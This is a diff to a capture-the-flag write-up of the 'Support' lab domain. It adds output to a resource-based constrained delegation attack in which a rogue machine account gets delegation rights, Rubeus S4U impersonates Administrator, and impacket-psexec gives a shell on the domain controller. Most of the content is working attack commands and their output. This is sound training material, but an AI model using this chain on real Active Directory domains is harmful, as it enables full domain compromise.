@@ -161,6 +161,10 @@ Further enumeration using **SharpHound** and **BloodHound** showed that the `sup
 
 ![BloodHound Data](Bloodhound_GenericAll.png)
 
+### **Did You Know? - RBCD attacks**
+
+> Resource-Based Constrained Delegation (RBCD) is a Windows feature that allows a computer account to delegate authentication on behalf of a user to specific services. Originally introduced to restrict unrestricted delegation, RBCD can be abused if an attacker gains control over a machine account with delegation privileges. This allows impersonation of privileged users like Administrator, leading to full domain compromise if misconfigured.
+
 A rogue computer account, **FAKE01**, was added to the domain using PowerMad:
 
 ```powershell
@@ -196,16 +200,35 @@ The new machine account was then given permissions to impersonate users
 *Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer "DC.SUPPORT.HTB" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
 
-With GenericAll privileges and RBCD in place, **FAKE01** was used to impersonate the **Administrator**. An RC4 hash for **FAKE01** was generated with Rubeus:
+With GenericAll privileges and RBCD in place, **FAKE01** can be used to impersonate the **Administrator**.
+An RC4 hash for **FAKE01** was generated with Rubeus:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\support\Documents> ./Rubeus.exe hash /password:'P@ssw0rd123!' /user:fake01 /domain:SUPPORT.HTB
+
+...
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : P@ssw0rd123!
+[*] Input username             : fake01
+[*] Input domain               : SUPPORT.HTB
+[*] Salt                       : SUPPORT.HTBfake01
+[*]       rc4_hmac             : 7DFA0531D73101CA080C7379A9BFF1C7
+...
 ```
 
 Then, a Kerberos ticket was requested for the **Administrator** account:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\support\Documents> ./Rubeus.exe s4u /user:fake01 /rc4:7DFA0531D73101CA080C7379A9BFF1C7 /impersonateuser:Administrator /msdsspn:cifs/DC.SUPPORT.HTB /ptt /nowrap
+
+...
+[*] base64(ticket.kirbi) for SPN 'cifs/DC.SUPPORT.HTB':
+
+doIGYDCCBlygAwIBBaEDAgEW...
+...5TVVBQT1JULkhUQg==
+
+[+] Ticket successfully imported!
 ```
 
 After confirming the ticket was cached using `klist`, the base64 kirbi ticket was converted to a ccache file:
@@ -215,20 +238,15 @@ After confirming the ticket was cached using `klist`, the base64 kirbi ticket wa
 ❯ sudo impacket-ticketConverter administrator.ticket.kirbi administrator.ccache
 ```
 
-With RBCD configured, the **Administrator’s ticket** was forged using `Rubeus`:
-
-```powershell
-*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:FAKE01 /rc4:P@ssw0rd123! /impersonateuser:Administrator /msdsspn:cifs/DC.SUPPORT.HTB /ptt
-```
-
 Finally, an **impacket-PsExec** session was established to gain domain admin access:
 
 ```sh
 ❯ KRB5CCNAME=administrator.ccache 
 ❯ sudo impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
-```
+...
+Microsoft Windows [Version 10.0.20348.859]
+(c) Microsoft Corporation. All rights reserved.
 
-```cmd
 C:\Users\Administrator\Desktop> type root.txt
 b34047xxxxxxxxxxxxx73db50
 ```
